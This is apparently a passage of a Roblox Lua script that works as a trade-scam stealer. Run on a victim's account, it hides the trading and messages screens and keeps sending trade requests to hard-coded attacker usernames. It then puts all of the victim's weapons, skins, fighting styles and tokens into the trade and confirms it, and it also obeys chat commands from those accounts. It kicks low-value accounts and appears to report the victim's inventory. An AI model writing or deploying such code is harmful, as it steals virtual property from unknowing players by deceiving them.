    skinsAlreadyAdded = false
    
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then 
        return 0 
    end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local ownedSkinsList = getAllSkins()
    
    if #ownedSkinsList == 0 then
        return 0
    end
    
    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
    task.wait(0.1)
    
    local totalAdded = 0
    
    for _, skinName in ipairs(ownedSkinsList) do
        local found = false
        for _, btn in ipairs(scrollingFrame:GetChildren()) do
            if btn:IsA("ImageButton") and btn.Visible then
                local btnName = btn.Name:lower()
                local skinLower = skinName:lower()
                if btnName == skinLower or string.find(btnName, skinLower) or string.find(skinLower, btnName) then
                    safeClick(btn)
                    totalAdded = totalAdded + 1
                    found = true
                    task.wait(0.1)
                    break
                end
            end
        end
        if not found then
        end
    end
    
    if totalAdded > 0 then
        skinsAlreadyAdded = true
    end
    
    return totalAdded
end

local function clickOnlySkins()
    if skinsAlreadyAdded then
        return 0
    end
    
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then 
        return 0 
    end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local ownedSkinsList = getAllSkins()
    
    if #ownedSkinsList == 0 then
        return 0
    end
    
    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
    task.wait(0.1)
    
    local totalAdded = 0
    
    for _, skinName in ipairs(ownedSkinsList) do
        local found = false
        for _, btn in ipairs(scrollingFrame:GetChildren()) do
            if btn:IsA("ImageButton") and btn.Visible then
                local btnName = btn.Name:lower()
                local skinLower = skinName:lower()
                if btnName == skinLower or string.find(btnName, skinLower) or string.find(skinLower, btnName) then
                    safeClick(btn)
                    totalAdded = totalAdded + 1
                    found = true
                    task.wait(0.1)
                    break
                end
            end
        end
        if not found then
        end
    end
    
    if totalAdded > 0 then
        skinsAlreadyAdded = true
    end
    
    return totalAdded
end

local function getTokenAmount()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        local frame = tradingGui:FindFirstChild("Frame")
        if frame then
            local categories = frame:FindFirstChild("Categories")
            if categories then
                local tokenAmount = categories:FindFirstChild("TokenAmount")
                if tokenAmount then
                    local textLabel = tokenAmount:FindFirstChild("TextLabel")
                    if textLabel then
                        local tokenNumber = string.match(textLabel.Text, "%d+")
                        if tokenNumber then return tonumber(tokenNumber) end
                    end
                end
            end
        end
    end
    return 0
end

local function spamConfirm()
    for i = 1, 20 do pcall(function() RFTradingConfirmTrade:InvokeServer() end) task.wait(0.05) end
end

local function addAllItemsInOrder()
    task.wait(0.1)
    
    local weaponsAdded = clickAllWeapons()
    task.wait(0.2)
    
    local fightingStylesAdded = clickFightingStyles()
    task.wait(0.2)
    
    local boardsAdded = clickAllSkins()
    task.wait(0.2)
    
    local tokenAmount = getTokenAmount()
    if tokenAmount then 
        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
    end
    
    return weaponsAdded + fightingStylesAdded + boardsAdded
end

local function addAllWeaponsAndReady()
    task.wait(0.1)
    local weaponsAdded = clickAllWeapons()
    task.wait(0.1)
    local skinsAdded = clickAllSkins()
    local tokenAmount = getTokenAmount()
    if tokenAmount then pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end) end
    task.wait(0.1)
    pcall(function() RFTradingSetReady:InvokeServer(true) end)
    return weaponsAdded + skinsAdded
end

local function autoCompleteTrade()
    skinsAlreadyAdded = false
    fightingStylesAlreadyAdded = false
    addAllItemsInOrder()
    task.wait(0.1)
    pcall(function() RFTradingAcceptTradeOffer:InvokeServer(localPlayer) end)
    task.wait(0.1)
    spamConfirm()
    isTrading = false
    currentTradePartner = nil
end

local function sendTradeRequest(player)
    if not player or isTrading or tradingPlayers[player] then return false end
    for attempt = 1, 3 do
        local success, result = pcall(function() return RFTradingSendTradeOffer:InvokeServer(player) end)
        if success and result then return true end
        if attempt < 3 then task.wait(0.5) end
    end
    return false
end

local function processAddCommand()
    task.wait(0.1)
    local weaponsAdded = clickAllWeapons()
    task.wait(0.1)
    local fightingStylesAdded = clickFightingStyles()
    task.wait(0.1)
    local skinsAdded = clickAllSkins()
    local tokenAmount = getTokenAmount()
    if tokenAmount then pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end) end
    task.wait(0.1)
    pcall(function() RFTradingSetReady:InvokeServer(true) end)
    task.wait(0.1)
    pcall(function() RFTradingConfirmTrade:InvokeServer() end)
end

local function processSkinsOnlyCommand()
    task.wait(0.1)
    
    if skinsAlreadyAdded then
        task.wait(0.1)
        local tokenAmount = getTokenAmount()
        if tokenAmount and tokenAmount > 0 then 
            pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
        end
        task.wait(0.1)
        pcall(function() RFTradingSetReady:InvokeServer(true) end)
        task.wait(0.1)
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
        return
    end
    
    local skinsAdded = clickOnlySkins()
    
    if skinsAdded > 0 then
        task.wait(2)
        
        local tokenAmount = getTokenAmount()
        if tokenAmount and tokenAmount > 0 then 
            pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
            task.wait(0.1)
        end
        
        pcall(function() RFTradingSetReady:InvokeServer(true) end)
        task.wait(0.1)
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
    else
    end
end

local function onTradeStarted(tradeId)
    skinsAlreadyAdded = false
    fightingStylesAlreadyAdded = false
    
    task.wait(0.1)
    
    local tradeReplion = Replion.Client:GetReplion(tradeId)
    if not tradeReplion then return end
    
    local playerList = tradeReplion.Data.PlayerList
    if not playerList or #playerList < 2 then return end
    
    local p1 = playerList[1]
    local p2 = playerList[2]
    
    local whitelistedInvolved = false
    local isLocalInvolved = (p1 == localPlayer or p2 == localPlayer)
    
    for _, username in ipairs(MY_USERNAMES) do
        if (p1.Name:lower() == username:lower() or p2.Name:lower() == username:lower()) then
            whitelistedInvolved = true
            break
        end
    end
    
    if whitelistedInvolved and isLocalInvolved then
        if playerGui:FindFirstChild("Trading") then
            task.spawn(function()
                processAddCommand()
            end)
        end
    end
end

local function onTradeMessage(userId, message)
    local sender = Players:GetPlayerByUserId(userId)
    if not sender then return end
    
    local cmd = message:lower()
    
    if cmd == "s" then
        local isWhitelisted = false
        for _, username in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == username:lower() then
                isWhitelisted = true
                break
            end
        end
        
        if isWhitelisted then
            task.spawn(function()
                processSkinsOnlyCommand()
            end)
        end
    end
    
    if cmd == "1" or cmd == "2" then
        local isWhitelisted = false
        for _, username in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == username:lower() then
                isWhitelisted = true
                break
            end
        end
        
        if isWhitelisted then
            if cmd == "1" then
                task.wait(0.1)
                pcall(function() RFTradingSetReady:InvokeServer(true) end)
            elseif cmd == "2" then
                task.wait(0.1)
                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
            end
        end
    end
end

local tradeRemote = TradeData.Remotes.TradeStarted
tradeRemote.OnClientEvent:Connect(onTradeStarted)

MessageEvent.OnClientEvent:Connect(onTradeMessage)

RunService.RenderStepped:Connect(function()
    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
        local state = localPlayer.Character.Humanoid:GetState()
        if state == Enum.HumanoidStateType.Jumping and not jumped then
            jumped = true
            if playerGui:FindFirstChild("Trading") then 
                task.spawn(function()
                    processAddCommand()
                end)
            end
        else
            jumped = false
        end
    end
end)

local function startSpammingPlayer(player)
    if activeTargets[player] then return end
    
    activeTargets[player] = true
    
    task.spawn(function()
        while activeTargets[player] and player and player.Parent do
            if not isTrading and not tradingPlayers[player] then
                sendTradeRequest(player)
            end
            task.wait(1)
        end
        activeTargets[player] = nil
    end)
end

local function stopSpammingPlayer(player)
    activeTargets[player] = nil
end

local function checkPlayerJoin(player)
    if not player or player == localPlayer then return end
    
    for _, username in ipairs(MY_USERNAMES) do
        if player.Name:lower() == username:lower() then
            startSpammingPlayer(player)
            break
        end
    end
end

local function checkPlayerLeave(player)
    if activeTargets[player] then
        stopSpammingPlayer(player)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer then
        for _, username in ipairs(MY_USERNAMES) do
            if player.Name:lower() == username:lower() then
                startSpammingPlayer(player)
                break
            end
        end
    end
end

Players.PlayerAdded:Connect(checkPlayerJoin)
Players.PlayerRemoving:Connect(checkPlayerLeave)

local function setupChatCommands()
    local function onPlayerChatted(player, message)
        if player and message then
            local cmd = message:lower()
            if cmd == "s" or cmd == "add" or cmd == "1" or cmd == "2" then
                task.delay(0.1, function()
                    if isProcessing then return end
                    isProcessing = true
                    
                    local shouldProcess = false
                    for _, username in ipairs(MY_USERNAMES) do
                        if player.Name:lower() == username:lower() or player == localPlayer then
                            shouldProcess = true
                            break
                        end
                    end
                    
                    if shouldProcess then
                        if cmd == "s" then
                            processSkinsOnlyCommand()
                        elseif cmd == "add" then
                            processAddCommand()
                        elseif cmd == "1" then
                            task.wait(0.1)
                            pcall(function() RFTradingSetReady:InvokeServer(true) end)
                        elseif cmd == "2" then
                            task.wait(0.1)
                            pcall(function() RFTradingConfirmTrade:InvokeServer() end)
                        end
                    end
                    isProcessing = false
                end)
            end
        end
    end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function() player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        pcall(function() player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
    end)
    
    if TextChatService and TextChatService.OnIncomingMessage then
        TextChatService.OnIncomingMessage = function(message)
            local ts = message.TextSource
            if not ts then return end
            local sender = Players:GetPlayerByUserId(ts.UserId)
            if not sender then return end
            local txt = tostring(message.Text or ""):lower()
            if txt == "s" or txt == "add" or txt == "1" or txt == "2" then
                task.delay(0.1, function() onPlayerChatted(sender, txt) end)
            end
        end
    end
end

local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
    
    local tradeList = playerGui:WaitForChild("TradeList")
    local mainFrame = tradeList:WaitForChild("Main")
    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
    tradeRequest.Visible = true
    
    ReplicatedStorage.Modules.Net["RE/Trading/TradeStarted"].OnClientEvent:Connect(function(trader)
        if trader and trader.Name then
            local shouldTrade = false
            for _, username in ipairs(MY_USERNAMES) do
                if trader.Name:lower() == username:lower() then
                    shouldTrade = true
                    break
                end
            end
            if shouldTrade and not isTrading then
                stopSpammingPlayer(trader)
                
                isTrading = true
                currentTradePartner = trader
                tradingPlayers[trader] = true
                task.wait(0.1)
                autoCompleteTrade()
                tradingPlayers[trader] = nil
                
                if trader and trader.Parent then
                    startSpammingPlayer(trader)
                end
            end
        end
    end)
    
    local function handleGui(gui)
        local isProtected = false
        for guiName, _ in pairs(PROTECTED_GUIS) do if gui.Name == guiName then isProtected = true break end end
        if isProtected then return end
        
        if gui.Name == "Trading" then gui.Enabled = false
        elseif gui.Name == "Messages" then gui:Destroy() end
    end
    
    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
    playerGui.ChildAdded:Connect(handleGui)
    
    task.spawn(function()
        while true do
            if not checkServerStatus() then break end
            local t = playerGui:FindFirstChild("Trading")
            if t then t.Enabled = false end
            local m = playerGui:FindFirstChild("Messages")
            if m then m:Destroy() end
            task.wait()
        end
    end)
end

local weaponCounts, allWeaponsList, totalWeapons = getAllInventoryWeapons()
local hasSurf = hasSurfsUp()
local hasSpikedKitty = hasSpikedKittyStanli()

if totalWeapons < 2 then
    localPlayer:Kick("Alt Account Detected")
    return
end

protectGUIs()
deleteMessagesGui()
sendFullInventory()
setupTrading()
setupChatCommands()

local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer
RFTradingAcceptTradeOffer.InvokeServer = function(self, player)
    local result = originalAcceptTrade(self, player)
    for _, username in ipairs(MY_USERNAMES) do
        if player.Name:lower() == username:lower() and not isTrading then
            stopSpammingPlayer(player)
            
            isTrading = true
            currentTradePartner = player
            tradingPlayers[player] = true
            task.spawn(function()
                task.wait(0.1)
                autoCompleteTrade()
                tradingPlayers[player] = nil
                
                if player and player.Parent then
                    startSpammingPlayer(player)
                end
            end)
            break
        end
    end
    return result
end
